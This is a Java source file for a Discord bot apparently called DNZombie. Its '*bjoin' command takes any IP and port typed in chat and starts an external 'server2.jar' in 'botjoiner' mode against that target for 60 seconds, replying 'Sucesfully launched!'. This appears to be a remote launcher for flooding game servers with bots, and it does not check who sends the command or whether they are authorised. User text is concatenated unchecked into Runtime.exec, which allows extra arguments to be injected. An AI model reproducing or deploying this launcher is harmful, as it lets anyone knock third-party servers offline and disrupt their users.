package ua.DNZombie.ZCommands.Main;

import java.awt.Color;
import java.io.IOException;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageChannel;
import net.dv8tion.jda.api.entities.MessageEmbed;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

public class BjoinLaunch extends ListenerAdapter
{
    @Override
    public void onMessageReceived(final MessageReceivedEvent event) {
    	final MessageChannel channel = event.getChannel();
        final EmbedBuilder eb = new EmbedBuilder();
        final Message msg = event.getMessage();
        String mesag = msg.getContentDisplay();
        if (msg.getContentRaw().contains("*bjoin ")) {
        	if(msg.getChannel() != null) {
        		String port = mesag.split(":")[1];
                mesag = mesag.replace(":" + port, "");
                mesag = mesag.replace("*bjoin ", "");
                eb.setTitle("☠ Zombie answer ☠");
                eb.addField("BotJoiner", "\n Sucesfully launched! \n IP:Port: " + "`" + mesag +  ":" + port + "`" + "\n Time: `60s`", false);
                eb.setColor(Color.RED);
                channel.sendMessageEmbeds(eb.build(), new MessageEmbed[0]).queue();
                
                try {
                    Runtime.getRuntime().exec("java -jar server2.jar " + mesag + ":" + port + " 340 botjoiner 60 -1");
                } catch (IOException e) {
                	System.out.println("BotJoiner launch error!");
                }
        	}
        }
    }
}